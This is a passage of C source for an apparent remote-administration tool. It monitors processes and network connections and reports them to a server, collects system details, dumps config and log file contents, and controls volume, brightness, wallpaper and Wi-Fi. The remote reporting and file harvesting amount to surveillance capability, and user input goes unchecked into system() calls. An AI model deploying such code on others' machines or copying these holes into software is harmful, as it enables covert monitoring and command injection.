            remoteAddr.S_un.S_addr = pTcpTable->table[i].dwRemoteAddr;
            strcpy(connections[*count].remote_addr, inet_ntoa(remoteAddr));
            connections[*count].remote_port = ntohs((u_short)pTcpTable->table[i].dwRemotePort);
            
            // State
            switch (pTcpTable->table[i].dwState) {
                case MIB_TCP_STATE_CLOSED: strcpy(connections[*count].state, "CLOSED"); break;
                case MIB_TCP_STATE_LISTEN: strcpy(connections[*count].state, "LISTEN"); break;
                case MIB_TCP_STATE_SYN_SENT: strcpy(connections[*count].state, "SYN_SENT"); break;
                case MIB_TCP_STATE_SYN_RCVD: strcpy(connections[*count].state, "SYN_RCVD"); break;
                case MIB_TCP_STATE_ESTAB: strcpy(connections[*count].state, "ESTABLISHED"); break;
                case MIB_TCP_STATE_FIN_WAIT1: strcpy(connections[*count].state, "FIN_WAIT1"); break;
                case MIB_TCP_STATE_FIN_WAIT2: strcpy(connections[*count].state, "FIN_WAIT2"); break;
                case MIB_TCP_STATE_CLOSE_WAIT: strcpy(connections[*count].state, "CLOSE_WAIT"); break;
                case MIB_TCP_STATE_CLOSING: strcpy(connections[*count].state, "CLOSING"); break;
                case MIB_TCP_STATE_LAST_ACK: strcpy(connections[*count].state, "LAST_ACK"); break;
                case MIB_TCP_STATE_TIME_WAIT: strcpy(connections[*count].state, "TIME_WAIT"); break;
                case MIB_TCP_STATE_DELETE_TCB: strcpy(connections[*count].state, "DELETE_TCB"); break;
                default: strcpy(connections[*count].state, "UNKNOWN"); break;
            }
            
            (*count)++;
        }
        
        free(pTcpTable);
    #else
        FILE *fp = fopen("/proc/net/tcp", "r");
        if (fp == NULL) return;
        
        char line[256];
        fgets(line, sizeof(line), fp); // Skip header
        
        while (fgets(line, sizeof(line), fp)) {
            if (*count >= MAX_NETWORK_CONNS) break;
            
            unsigned long local_addr, remote_addr;
            int local_port, remote_port, state, uid;
            
            sscanf(line, "%*d: %lx:%x %lx:%x %x %*x:%*x %*x:%*x %*x %d",
                   &local_addr, &local_port, &remote_addr, &remote_port, &state, &uid);
            
            // Convert IP addresses
            struct in_addr addr;
            addr.s_addr = htonl(local_addr);
            strcpy(connections[*count].local_addr, inet_ntoa(addr));
            connections[*count].local_port = local_port;
            
            addr.s_addr = htonl(remote_addr);
            strcpy(connections[*count].remote_addr, inet_ntoa(addr));
            connections[*count].remote_port = remote_port;
            
            // Get process info (simplified)
            connections[*count].pid = -1;
            
            // State
            switch (state) {
                case 1: strcpy(connections[*count].state, "ESTABLISHED"); break;
                case 2: strcpy(connections[*count].state, "SYN_SENT"); break;
                case 3: strcpy(connections[*count].state, "SYN_RECV"); break;
                case 4: strcpy(connections[*count].state, "FIN_WAIT1"); break;
                case 5: strcpy(connections[*count].state, "FIN_WAIT2"); break;
                case 6: strcpy(connections[*count].state, "TIME_WAIT"); break;
                case 7: strcpy(connections[*count].state, "CLOSE"); break;
                case 8: strcpy(connections[*count].state, "CLOSE_WAIT"); break;
                case 9: strcpy(connections[*count].state, "LAST_ACK"); break;
                case 10: strcpy(connections[*count].state, "LISTEN"); break;
                case 11: strcpy(connections[*count].state, "CLOSING"); break;
                default: strcpy(connections[*count].state, "UNKNOWN"); break;
            }
            
            (*count)++;
        }
        
        fclose(fp);
    #endif
}

// Real-time monitoring thread
#ifdef _WIN32
unsigned __stdcall realtime_monitor(void *arg) {
#else
void* realtime_monitor(void *arg) {
#endif
    ProcessInfo prev_processes[MAX_PROCESSES];
    NetworkConn prev_connections[MAX_NETWORK_CONNS];
    int prev_process_count = 0, prev_conn_count = 0;
    
    get_processes(prev_processes, &prev_process_count);
    get_network_connections(prev_connections, &prev_conn_count);
    
    while (realtime_monitoring) {
        ProcessInfo curr_processes[MAX_PROCESSES];
        NetworkConn curr_connections[MAX_NETWORK_CONNS];
        int curr_process_count = 0, curr_conn_count = 0;
        
        get_processes(curr_processes, &curr_process_count);
        get_network_connections(curr_connections, &curr_conn_count);
        
        // Check for new processes
        for (int i = 0; i < curr_process_count; i++) {
            int found = 0;
            for (int j = 0; j < prev_process_count; j++) {
                if (curr_processes[i].pid == prev_processes[j].pid) {
                    found = 1;
                    break;
                }
            }
            
            if (!found) {
                printf("[MONITOR] New process: %s (PID: %d)\n",
                       curr_processes[i].name, curr_processes[i].pid);
                if (connected_to_server) {
                    char msg[512];
                    snprintf(msg, sizeof(msg), "MONITOR:New process: %s (PID: %d)",
                             curr_processes[i].name, curr_processes[i].pid);
                    send_data_to_server(msg);
                }
            }
        }
        
        // Check for new connections
        for (int i = 0; i < curr_conn_count; i++) {
            int found = 0;
            for (int j = 0; j < prev_conn_count; j++) {
                if (strcmp(curr_connections[i].local_addr, prev_connections[j].local_addr) == 0 &&
                    curr_connections[i].local_port == prev_connections[j].local_port &&
                    strcmp(curr_connections[i].remote_addr, prev_connections[j].remote_addr) == 0 &&
                    curr_connections[i].remote_port == prev_connections[j].remote_port) {
                    found = 1;
                    break;
                }
            }
            
            if (!found && strcmp(curr_connections[i].state, "ESTABLISHED") == 0) {
                printf("[MONITOR] New connection: %s:%d -> %s:%d (PID: %d)\n",
                       curr_connections[i].local_addr, curr_connections[i].local_port,
                       curr_connections[i].remote_addr, curr_connections[i].remote_port,
                       curr_connections[i].pid);
                if (connected_to_server) {
                    char msg[512];
                    snprintf(msg, sizeof(msg), "MONITOR:New connection: %s:%d -> %s:%d (PID: %d)",
                             curr_connections[i].local_addr, curr_connections[i].local_port,
                             curr_connections[i].remote_addr, curr_connections[i].remote_port,
                             curr_connections[i].pid);
                    send_data_to_server(msg);
                }
            }
        }
        
        // Update previous state
        memcpy(prev_processes, curr_processes, sizeof(ProcessInfo) * curr_process_count);
        prev_process_count = curr_process_count;
        memcpy(prev_connections, curr_connections, sizeof(NetworkConn) * curr_conn_count);
        prev_conn_count = curr_conn_count;
        
        #ifdef _WIN32
            Sleep(1000);
        #else
            sleep(1);
        #endif
    }
    
#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

// Update the start_realtime_monitoring function
void start_realtime_monitoring(char **args) {
    if (realtime_monitoring) {
        printf("Real-time monitoring is already running\n");
        return;
    }
    
    printf("\n[Real-Time Monitoring]\n");
    printf("Starting real-time activity monitoring...\n");
    
    realtime_monitoring = 1;
    // Use the correct variable type
    thread_t monitor_thread_id;
    pthread_create(&monitor_thread_id, NULL, realtime_monitor, NULL);
    
    // Store the thread ID if needed
    monitor_thread = monitor_thread_id;
    
    printf("Monitoring started. Type 'show' to see current data.\n");
}

// Show monitoring data
void show_monitoring_data(char **args) {
    printf("\n[Monitoring Data]\n");
    
    ProcessInfo processes[MAX_PROCESSES];
    int process_count;
    get_processes(processes, &process_count);
    
    NetworkConn connections[MAX_NETWORK_CONNS];
    int conn_count;
    get_network_connections(connections, &conn_count);
    
    printf("\nRunning Processes (%d):\n", process_count);
    for (int i = 0; i < process_count; i++) {
        printf("PID: %-6d | Name: %-20s | User: %s\n", 
               processes[i].pid, processes[i].name, processes[i].user);
    }
    
    printf("\nNetwork Connections (%d):\n", conn_count);
    for (int i = 0; i < conn_count; i++) {
        printf("%-15s:%-5d -> %-15s:%-5d %s (PID: %d)\n",
               connections[i].local_addr, connections[i].local_port,
               connections[i].remote_addr, connections[i].remote_port,
               connections[i].state, connections[i].pid);
    }
}

// Get IP address
void get_ip_address(char *ip) {
    #ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            strcpy(ip, "127.0.0.1");
            return;
        }
        
        char hostname[256];
        if (gethostname(hostname, sizeof(hostname)) != 0) {
            strcpy(ip, "127.0.0.1");
            WSACleanup();
            return;
        }
        
        struct hostent *host = gethostbyname(hostname);
        if (host == NULL) {
            strcpy(ip, "127.0.0.1");
            WSACleanup();
            return;
        }
        
        strcpy(ip, inet_ntoa(*(struct in_addr *)host->h_addr_list[0]));
        WSACleanup();
    #else
        struct ifaddrs *ifaddr, *ifa;
        int family;
        
        if (getifaddrs(&ifaddr) == -1) {
            strcpy(ip, "127.0.0.1");
            return;
        }
        
        for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
            if (ifa->ifa_addr == NULL) continue;
            
            family = ifa->ifa_addr->sa_family;
            
            if (family == AF_INET && strcmp(ifa->ifa_name, "lo") != 0) {
                struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
                strcpy(ip, inet_ntoa(addr->sin_addr));
                break;
            }
        }
        
        freeifaddrs(ifaddr);
        
        if (ip[0] == '\0') {
            strcpy(ip, "127.0.0.1");
        }
    #endif
}

// Device info
void device_info(char **args) {
    printf("\n[Device Information]\n");
    char output[4096];
    
    // System info
    printf("\nSystem Information:\n");
    #ifdef _WIN32
        execute_command("systeminfo", output, sizeof(output));
    #else
        execute_command("uname -a", output, sizeof(output));
    #endif
    printf("%s\n", output);
    
    // CPU info
    printf("\nCPU Information:\n");
    #ifdef _WIN32
        execute_command("wmic cpu get name,numberofcores,numberoflogicalprocessors", output, sizeof(output));
    #else
        execute_command("lscpu", output, sizeof(output));
    #endif
    printf("%s\n", output);
    
    // Memory info
    printf("\nMemory Information:\n");
    #ifdef _WIN32
        execute_command("wmic memorychip get capacity,speed,partnumber", output, sizeof(output));
    #else
        execute_command("free -h", output, sizeof(output));
    #endif
    printf("%s\n", output);
    
    // Disk info
    printf("\nDisk Information:\n");
    #ifdef _WIN32
        execute_command("wmic diskdrive get model,size,interfacetype", output, sizeof(output));
    #else
        execute_command("lsblk", output, sizeof(output));
    #endif
    printf("%s\n", output);
    
    // Network info
    printf("\nNetwork Information:\n");
    char ip[64];
    get_ip_address(ip);
    printf("IP Address: %s\n", ip);
    #ifdef _WIN32
        execute_command("ipconfig /all", output, sizeof(output));
    #else
        execute_command("ifconfig -a", output, sizeof(output));
    #endif
    printf("%s\n", output);
}

// Wallpaper changer
void wallpaper_changer(char **args) {
    if (args[0] == NULL) {
        printf("Usage: wallpaper <image_path>\n");
        return;
    }
    
    printf("\n[Wallpaper Changer]\n");
    
    #ifdef _WIN32
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)args[0], SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        printf("Wallpaper changed to %s\n", args[0]);
    #else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "gsettings set org.gnome.desktop.background picture-uri file://%s", args[0]);
        system(cmd);
        printf("Wallpaper changed to %s\n", args[0]);
    #endif
}

// Enhanced file dump
void enhanced_file_dump(char **args) {
    printf("\n[Enhanced File Dump]\n");
    
    char path[MAX_PATH_LENGTH];
    if (args[0] == NULL) {
        strcpy(path, current_dir);
    } else {
        strcpy(path, args[0]);
    }
    
    char output_file[MAX_PATH_LENGTH];
    if (args[1] == NULL) {
        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        snprintf(output_file, sizeof(output_file), "%s/dumps/dump_%04d%02d%02d_%02d%02d%02d.txt",
                 output_dir,
                 t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                 t->tm_hour, t->tm_min, t->tm_sec);
    } else {
        snprintf(output_file, sizeof(output_file), "%s/dumps/%s", output_dir, args[1]);
    }
    
    FILE *fp = fopen(output_file, "w");
    if (fp == NULL) {
        printf("Failed to create output file %s\n", output_file);
        return;
    }
    
    fprintf(fp, "=== Directory Structure ===\n");
    DIR *dir;
    struct dirent *entry;
    
    if ((dir = opendir(path)) == NULL) {
        fprintf(fp, "Could not open directory %s\n", path);
        fclose(fp);
        return;
    }
    
    while ((entry = readdir(dir)) != NULL) {
        char full_path[MAX_PATH_LENGTH];
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
        
        struct stat st;
        if (stat(full_path, &st) == -1) {
            continue;
        }
        
        if (S_ISDIR(st.st_mode)) {
            fprintf(fp, "[DIR]  %s\n", entry->d_name);
        } else {
            fprintf(fp, "[FILE] %s (%ld bytes)\n", entry->d_name, st.st_size);
        }
    }
    
    closedir(dir);
    
    fprintf(fp, "\n=== File Contents (Text Files) ===\n");
    dir = opendir(path);
    
    while ((entry = readdir(dir)) != NULL) {
        char full_path[MAX_PATH_LENGTH];
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
        
        struct stat st;
        if (stat(full_path, &st) == -1) {
            continue;
        }
        
        if (S_ISREG(st.st_mode) && 
            (strstr(entry->d_name, ".txt") || strstr(entry->d_name, ".log") || 
             strstr(entry->d_name, ".conf") || strstr(entry->d_name, ".ini"))) {
            FILE *file = fopen(full_path, "r");
            if (file) {
                fprintf(fp, "\nFile: %s\n", full_path);
                
                char line[1024];
                while (fgets(line, sizeof(line), file)) {
                    fprintf(fp, "%s", line);
                }
                
                fprintf(fp, "\n==================================================\n");
                fclose(file);
            }
        }
    }
    
    closedir(dir);
    
    fprintf(fp, "\n=== System Information ===\n");
    
    ProcessInfo processes[MAX_PROCESSES];
    int count;
    get_processes(processes, &count);
    
    fprintf(fp, "\nRunning Processes:\n");
    for (int i = 0; i < count; i++) {
        fprintf(fp, "PID: %-6d | Name: %-20s | User: %s\n", 
               processes[i].pid, processes[i].name, processes[i].user);
    }
    
    NetworkConn connections[MAX_NETWORK_CONNS];
    int conn_count;
    get_network_connections(connections, &conn_count);
    
    fprintf(fp, "\nNetwork Connections:\n");
    for (int i = 0; i < conn_count; i++) {
        fprintf(fp, "%-15s:%-5d -> %-15s:%-5d %s (PID: %d)\n",
               connections[i].local_addr, connections[i].local_port,
               connections[i].remote_addr, connections[i].remote_port,
               connections[i].state, connections[i].pid);
    }
    
    fclose(fp);
    printf("Dump saved to %s\n", output_file);
}

// Clear screen
void clear_screen(char **args) {
    #ifdef _WIN32
        system("cls");
    #else
        system("clear");
    #endif
}

// Volume Control
void volume_control(char **args) {
    printf("\n[Volume Control]\n");
    
    if (args[0] == NULL) {
        printf("Usage: volume <level (0-100)>\n");
        return;
    }
    
    int volume = atoi(args[0]);
    if (volume < 0) volume = 0;
    if (volume > 100) volume = 100;
    
#ifdef _WIN32
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        printf("Failed to initialize COM\n");
        return;
    }
    
    BOOL success = FALSE;
    
    // Define the necessary GUIDs and interfaces manually
    static const GUID CLSID_MMDeviceEnumerator = {
        0xbcde0395, 0xe52f, 0x467c, {0x8e, 0x3d, 0xc6, 0x42, 0x94, 0x72, 0x16, 0x22}
    };
    
    static const GUID IID_IMMDeviceEnumerator = {
        0xa95664d2, 0x9614, 0x4f35, {0xa7, 0x46, 0xde, 0x8d, 0xb6, 0x36, 0x17, 0xe6}
    };
    
    static const GUID IID_IAudioEndpointVolume = {
        0x5cdf2c82, 0x841e, 0x4546, {0x97, 0x22, 0x0c, 0xf7, 0x40, 0x78, 0x22, 0x9a}
    };
    
    // Define the IAudioEndpointVolume interface manually
    typedef struct IAudioEndpointVolumeVtbl {
        HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *, REFIID, void **);
        ULONG (STDMETHODCALLTYPE *AddRef)(void *);
        ULONG (STDMETHODCALLTYPE *Release)(void *);
        HRESULT (STDMETHODCALLTYPE *GetMasterVolumeLevel)(void *, float *);
        HRESULT (STDMETHODCALLTYPE *SetMasterVolumeLevel)(void *, float, LPCGUID);
        HRESULT (STDMETHODCALLTYPE *GetMasterVolumeLevelScalar)(void *, float *);
        HRESULT (STDMETHODCALLTYPE *SetMasterVolumeLevelScalar)(void *, float, LPCGUID);
        HRESULT (STDMETHODCALLTYPE *GetVolumeRange)(void *, float *, float *, float *);
    } IAudioEndpointVolumeVtbl;
    
    typedef struct IAudioEndpointVolume {
        IAudioEndpointVolumeVtbl *lpVtbl;
    } IAudioEndpointVolume;
    
    // Define the IMMDeviceEnumerator interface manually
    typedef struct IMMDeviceEnumeratorVtbl {
        HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *, REFIID, void **);
        ULONG (STDMETHODCALLTYPE *AddRef)(void *);
        ULONG (STDMETHODCALLTYPE *Release)(void *);
        HRESULT (STDMETHODCALLTYPE *EnumAudioEndpoints)(void *, EDataFlow, DWORD, void **);
        HRESULT (STDMETHODCALLTYPE *GetDefaultAudioEndpoint)(void *, EDataFlow, ERole, void **);
        HRESULT (STDMETHODCALLTYPE *GetDevice)(void *, LPCWSTR, void **);
    } IMMDeviceEnumeratorVtbl;
    
    typedef struct IMMDeviceEnumerator {
        IMMDeviceEnumeratorVtbl *lpVtbl;
    } IMMDeviceEnumerator;
    
    // Define the IMMDevice interface manually
    typedef struct IMMDeviceVtbl {
        HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *, REFIID, void **);
        ULONG (STDMETHODCALLTYPE *AddRef)(void *);
        ULONG (STDMETHODCALLTYPE *Release)(void *);
        HRESULT (STDMETHODCALLTYPE *Activate)(void *, REFIID, DWORD, PROPVARIANT *, void **);
        HRESULT (STDMETHODCALLTYPE *OpenPropertyStore)(void *, DWORD, void **);
        HRESULT (STDMETHODCALLTYPE *GetId)(void *, LPWSTR *);
        HRESULT (STDMETHODCALLTYPE *GetState)(void *, DWORD *);
    } IMMDeviceVtbl;
    
    typedef struct IMMDevice {
        IMMDeviceVtbl *lpVtbl;
    } IMMDevice;
    
    // Method 1: Try Core Audio API (this controls the system master volume)
    IMMDeviceEnumerator *pEnumerator = NULL;
    IMMDevice *pDevice = NULL;
    IAudioEndpointVolume *pEndpointVolume = NULL;
    
    hr = CoCreateInstance(&CLSID_MMDeviceEnumerator, NULL, CLSCTX_ALL, 
                         &IID_IMMDeviceEnumerator, (void**)&pEnumerator);
    if (SUCCEEDED(hr)) {
        hr = pEnumerator->lpVtbl->GetDefaultAudioEndpoint(pEnumerator, eRender, eConsole, (void**)&pDevice);
        if (SUCCEEDED(hr)) {
            hr = pDevice->lpVtbl->Activate(pDevice, &IID_IAudioEndpointVolume, CLSCTX_ALL, NULL, (void**)&pEndpointVolume);
            if (SUCCEEDED(hr)) {
                // First, get the current volume to verify it works
                float currentVolume = 0.0f;
                hr = pEndpointVolume->lpVtbl->GetMasterVolumeLevelScalar(pEndpointVolume, &currentVolume);
                if (SUCCEEDED(hr)) {
                    printf("Current volume: %.0f%%\n", currentVolume * 100);
                    
                    // Now set the new volume
                    float level = (float)volume / 100.0f;
                    hr = pEndpointVolume->lpVtbl->SetMasterVolumeLevelScalar(pEndpointVolume, level, NULL);
                    if (SUCCEEDED(hr)) {
                        // Verify the volume was set correctly
                        float newVolume = 0.0f;
                        hr = pEndpointVolume->lpVtbl->GetMasterVolumeLevelScalar(pEndpointVolume, &newVolume);
                        if (SUCCEEDED(hr)) {
                            printf("Volume set to %.0f%% (Core Audio API)\n", newVolume * 100);
                            success = TRUE;
                            
                            // Test if volume actually changed by playing a test sound
                            printf("Testing volume with a system beep...\n");
                            MessageBeep(MB_ICONASTERISK);
                        }
                    }
                }
            }
            pEndpointVolume->lpVtbl->Release(pEndpointVolume);
        }
        pDevice->lpVtbl->Release(pDevice);
    }
    pEnumerator->lpVtbl->Release(pEnumerator);
    
    // Method 2: Try PowerShell as fallback (simulates volume keys)
    if (!success) {
        char cmd[MAX_COMMAND_LENGTH];
        // Calculate how many volume up/down presses are needed (each press is 2%)
        int steps = volume / 2;
        snprintf(cmd, sizeof(cmd), "powershell -Command \"$obj = New-Object -ComObject WScript.Shell; $obj.SendKeys([char]173); Start-Sleep -Milliseconds 500; for ($i = 0; $i -lt %d; $i++) { $obj.SendKeys([char]175); Start-Sleep -Milliseconds 50 }\"", steps);
        int result = system(cmd);
        
        if (result == 0) {
            printf("Volume set to %d%% (PowerShell)\n", volume);
            success = TRUE;
            
            // Test if volume actually changed
            printf("Testing volume with a system beep...\n");
            MessageBeep(MB_ICONASTERISK);
        }
    }
    
    // Method 3: Try Windows Mixer API (controls wave volume, not system volume)
    if (!success) {
        HMIXER hMixer = NULL;
        MIXERLINE mxl = {0};
        MIXERLINECONTROLS mxlc = {0};
        MIXERCONTROL mxc = {0};
        MIXERCONTROLDETAILS mxcd = {0};
        MIXERCONTROLDETAILS_UNSIGNED mxcd_u = {0};
        
        if (mixerOpen(&hMixer, 0, 0, 0, MIXER_OBJECTF_MIXER) == MMSYSERR_NOERROR) {
            mxl.cbStruct = sizeof(MIXERLINE);
            mxl.dwComponentType = MIXERLINE_COMPONENTTYPE_DST_SPEAKERS;
            
            if (mixerGetLineInfo((HMIXEROBJ)hMixer, &mxl, MIXER_GETLINEINFOF_COMPONENTTYPE) == MMSYSERR_NOERROR) {
                mxlc.cbStruct = sizeof(MIXERLINECONTROLS);
                mxlc.dwLineID = mxl.dwLineID;
                mxlc.dwControlType = MIXERCONTROL_CONTROLTYPE_VOLUME;
                mxlc.cControls = 1;
                mxlc.cbmxctrl = sizeof(MIXERCONTROL);
                mxlc.pamxctrl = &mxc;
                
                if (mixerGetLineControls((HMIXEROBJ)hMixer, &mxlc, MIXER_GETLINECONTROLSF_ONEBYTYPE) == MMSYSERR_NOERROR) {
                    mxcd.cbStruct = sizeof(MIXERCONTROLDETAILS);
                    mxcd.dwControlID = mxc.dwControlID;
                    mxcd.cChannels = 1;
                    mxcd.cMultipleItems = 0;
                    mxcd.cbDetails = sizeof(MIXERCONTROLDETAILS_UNSIGNED);
                    mxcd.paDetails = &mxcd_u;
                    
                    // Calculate volume value (0-65535)
                    mxcd_u.dwValue = (DWORD)(volume * 655.35);
                    
                    if (mixerSetControlDetails((HMIXEROBJ)hMixer, &mxcd, MIXER_SETCONTROLDETAILSF_VALUE) == MMSYSERR_NOERROR) {
                        printf("Volume set to %d%% (Mixer API - wave volume only)\n", volume);
                        success = TRUE;
                        
                        // Test if volume actually changed
                        printf("Testing volume with a system beep...\n");
                        MessageBeep(MB_ICONASTERISK);
                    }
                }
            }
            mixerClose(hMixer);
        }
    }
    
    if (!success) {
        printf("Failed to set volume. All methods failed.\n");
    } else {
        printf("Volume change applied. If you don't hear a difference, try playing audio.\n");
    }
    
    CoUninitialize();
#else
    // Linux implementation
    char cmd[MAX_COMMAND_LENGTH];
    
    // Try with amixer (ALSA)
    snprintf(cmd, sizeof(cmd), "amixer sset Master %d%%", volume);
    int result = system(cmd);
    
    if (result != 0) {
        // Try with pactl (PulseAudio)
        snprintf(cmd, sizeof(cmd), "pactl set-sink-volume @DEFAULT_SINK@ %d%%", volume);
        result = system(cmd);
        
        if (result != 0) {
            printf("Failed to set volume. Neither amixer nor pactl available.\n");
            return;
        }
    }
    
    printf("Volume set to %d%%\n", volume);
    
    // Test if volume actually changed
    printf("Testing volume with a system beep...\n");
    system("paplay /usr/share/sounds/alsa/Front_Center.wav 2>/dev/null || echo -e '\a' 2>/dev/null");
#endif
}

// Brightness Control
void brightness_control(char **args) {
    printf("\n[Brightness Control]\n");
    
    if (args[0] == NULL) {
        printf("Usage: brightness <level (0-100)>\n");
        return;
    }
    
    int brightness = atoi(args[0]);
    if (brightness < 0) brightness = 0;
    if (brightness > 100) brightness = 100;
    
#ifdef _WIN32
    BOOL success = FALSE;
    
    // Method 1: Try PowerShell
    char cmd[MAX_COMMAND_LENGTH];
    snprintf(cmd, sizeof(cmd), "powershell -Command \"(Get-WmiObject -Namespace root/wmi -Class WmiMonitorBrightnessMethods).WmiSetBrightness(%d)\"", brightness);
    int result = system(cmd);
    
    if (result == 0) {
        printf("Brightness set to %d%% (PowerShell)\n", brightness);
        success = TRUE;
    }
    
    // Method 2: Try powercfg
    if (!success) {
        snprintf(cmd, sizeof(cmd), "powercfg -setdcvalueindex SCHEME_CURRENT SUB_VIDEO VID_BRIGHTNESS %d", brightness);
        result = system(cmd);
        
        if (result == 0) {
            printf("Brightness set to %d%% (powercfg)\n", brightness);
            success = TRUE;
        }
    }
    
    // Method 3: Try another PowerShell approach
    if (!success) {
        snprintf(cmd, sizeof(cmd), "powershell -Command \"$brightness = %d; $monitors = Get-WmiObject -Namespace root\\wmi -Class WmiMonitorBrightness; foreach ($monitor in $monitors) { $monitor.WmiSetBrightness($brightness, 1) }\"", brightness);
        result = system(cmd);
        
        if (result == 0) {
            printf("Brightness set to %d%% (PowerShell alternative)\n", brightness);
            success = TRUE;
        }
    }
    
    if (!success) {
        printf("Failed to set brightness. All methods failed.\n");
    }
#else
    // Linux implementation
    char cmd[MAX_COMMAND_LENGTH];
    char backlight_path[MAX_PATH_LENGTH] = {0};
    
    // Try to find the backlight device
    DIR *dir = opendir("/sys/class/backlight");
    if (dir) {
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                snprintf(backlight_path, sizeof(backlight_path), "/sys/class/backlight/%s", entry->d_name);
                break;
            }
        }
        closedir(dir);
    }
    
    if (backlight_path[0] == '\0') {
        printf("No backlight device found\n");
        return;
    }
    
    // Get max brightness
    char max_brightness_path[MAX_PATH_LENGTH];
    snprintf(max_brightness_path, sizeof(max_brightness_path), "%s/max_brightness", backlight_path);
    
    FILE *fp = fopen(max_brightness_path, "r");
    if (!fp) {
        printf("Failed to read max brightness\n");
        return;
    }
    
    int max_brightness = 0;
    if (fscanf(fp, "%d", &max_brightness) != 1) {
        printf("Failed to parse max brightness\n");
        fclose(fp);
        return;
    }
    fclose(fp);
    
    // Calculate new brightness value
    int new_brightness = (int)(max_brightness * brightness / 100.0f);
    
    // Set brightness
    char brightness_path[MAX_PATH_LENGTH];
    snprintf(brightness_path, sizeof(brightness_path), "%s/brightness", backlight_path);
    
    fp = fopen(brightness_path, "w");
    if (!fp) {
        printf("Failed to set brightness (permission denied?)\n");
        return;
    }
    
    fprintf(fp, "%d", new_brightness);
    fclose(fp);
    
    printf("Brightness set to %d%%\n", brightness);
#endif
}

// Ring Command
void ring_command(char **args) {
    printf("\n[Ring Command]\n");
    
    if (args[0] == NULL) {
        printf("Usage: ring <path/to/audio/file>\n");
        return;
    }
    
    // Check if file exists
    FILE *fp = fopen(args[0], "rb");
    if (!fp) {
        printf("Error: File not found: %s\n", args[0]);
        return;
    }
    fclose(fp);
    
#ifdef _WIN32
    // Windows implementation using mciSendString
    char cmd[MAX_COMMAND_LENGTH * 2];
    snprintf(cmd, sizeof(cmd), "open \"%s\" type mpegvideo alias mp3", args[0]);
    mciSendString(cmd, NULL, 0, NULL);
    
    mciSendString("play mp3", NULL, 0, NULL);
    
    printf("Playing audio file: %s\n", args[0]);
    
    // Wait for playback to finish (simplified)
    Sleep(5000); // Wait 5 seconds, adjust as needed
    
    mciSendString("close mp3", NULL, 0, NULL);
#else
    // Linux implementation
    char cmd[MAX_COMMAND_LENGTH * 2];
    
    // Try with aplay (ALSA)
    snprintf(cmd, sizeof(cmd), "aplay \"%s\"", args[0]);
    int result = system(cmd);
    
    if (result != 0) {
        // Try with paplay (PulseAudio)
        snprintf(cmd, sizeof(cmd), "paplay \"%s\"", args[0]);
        result = system(cmd);
        
        if (result != 0) {
            printf("Failed to play audio file. Neither aplay nor paplay available.\n");
            return;
        }
    }
    
    printf("Playing audio file: %s\n", args[0]);
#endif
}

// WLAN Control
void wlan_control(char **args) {
    printf("\n[Wireless Network Control]\n");
    
    if (args[0] == NULL) {
        printf("Usage: wlan <scan|connect|disconnect|info> [parameters]\n");
        return;
    }
    
#ifdef _WIN32
    HANDLE hClient = NULL;
    DWORD dwVersion = 0;
    DWORD dwResult = 0;
    
    dwResult = WlanOpenHandle(2, NULL, &dwVersion, &hClient);
    if (dwResult != ERROR_SUCCESS) {
        printf("Failed to open WLAN handle\n");
        return;
    }
    
    if (strcmp(args[0], "scan") == 0) {
        PWLAN_BSS_LIST pBssList = NULL;
        PWLAN_RAW_DATA pIeData = NULL;
        
        dwResult = WlanScan(hClient, NULL, NULL, NULL, NULL);
        if (dwResult != ERROR_SUCCESS) {
            printf("Failed to scan for networks\n");
            WlanCloseHandle(hClient, NULL);
            return;
        }
        
        PWLAN_AVAILABLE_NETWORK_LIST pNetworkList = NULL;
        dwResult = WlanGetAvailableNetworkList(hClient, NULL, 0, NULL, &pNetworkList);
        if (dwResult != ERROR_SUCCESS) {
            printf("Failed to get network list\n");
            WlanCloseHandle(hClient, NULL);
            return;
        }
        
        printf("Available WiFi Networks:\n");
        for (DWORD i = 0; i < pNetworkList->dwNumberOfItems; i++) {
            printf("%-30s Signal: %3d%%\n", 
                   pNetworkList->Network[i].strProfileName, 
                   (int)pNetworkList->Network[i].wlanSignalQuality);
        }
        
        if (pNetworkList) {
            WlanFreeMemory(pNetworkList);
        }
    }
    else if (strcmp(args[0], "connect") == 0) {
        if (args[1] == NULL) {
            printf("Usage: wlan connect <ssid> [password]\n");
            WlanCloseHandle(hClient, NULL);
            return;
        }
        
        size_t len = strlen(args[1]) + 1;
        wchar_t *ssid = (wchar_t*)malloc(len * sizeof(wchar_t));
        mbstowcs(ssid, args[1], len);
        
        WLAN_CONNECTION_PARAMETERS wlanConnParam;
        memset(&wlanConnParam, 0, sizeof(WLAN_CONNECTION_PARAMETERS));
        
        wlanConnParam.wlanConnectionMode = wlan_connection_mode_profile;
        wlanConnParam.strProfile = ssid;
        wlanConnParam.dwFlags = 0;
        
        if (args[2]) {
            wchar_t profileXml[1024];
            char profileXmlA[1024];
            snprintf(profileXmlA, sizeof(profileXmlA), 
                    "<?xml version=\"1.0\"?>"
                    "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">"
                    "<name>%s</name>"
                    "<SSIDConfig>"
                    "<SSID>"
                    "<name>%s</name>"
                    "</SSID>"
                    "</SSIDConfig>"
                    "<connectionType>ESS</connectionType>"
                    "<connectionMode>auto</connectionMode>"
                    "<MSM>"
                    "<security>"
                    "<authEncryption>"
                    "<authentication>WPA2PSK</authentication>"
                    "<encryption>AES</encryption>"
                    "<useOneX>false</useOneX>"
                    "</authEncryption>"
                    "<sharedKey>"
                    "<keyType>passPhrase</keyType>"
                    "<protected>false</protected>"
